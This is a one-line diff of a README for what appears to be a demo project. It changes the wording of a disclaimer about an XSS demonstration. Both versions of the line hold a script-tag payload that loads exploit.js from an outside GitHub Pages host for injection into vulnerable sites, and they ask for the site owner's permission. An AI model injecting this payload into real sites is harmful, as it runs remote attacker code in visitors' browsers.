@@ -8,4 +8,4 @@ To demonstrate how this works, follow [this link to GitHub pages](https://almroo
 
 ### XSS
 
-If you ever want to demonstrate the possibilities of a XSS vulnerability (as shown in the blog post), you may make an inclusion of [exploit.js](https://almroot.github.io/doom/exploit.js) like so: `<script src='https://almroot.github.io/doom/exploit.js'></script>`. Please note that I take no responsibilities for your actions, make sure you have permissions from the website owner(s) before doing anything stupid.
+If you ever want to demonstrate the possibilities of a XSS vulnerability (as shown in the blog post), you may make an inclusion of [exploit.js](https://almroot.github.io/doom/exploit.js) like so: `<script src='https://almroot.github.io/doom/exploit.js'></script>`. Please note that I take no responsibilities for your actions, make sure you have permissions from the website owner(s) before doing anything bad.
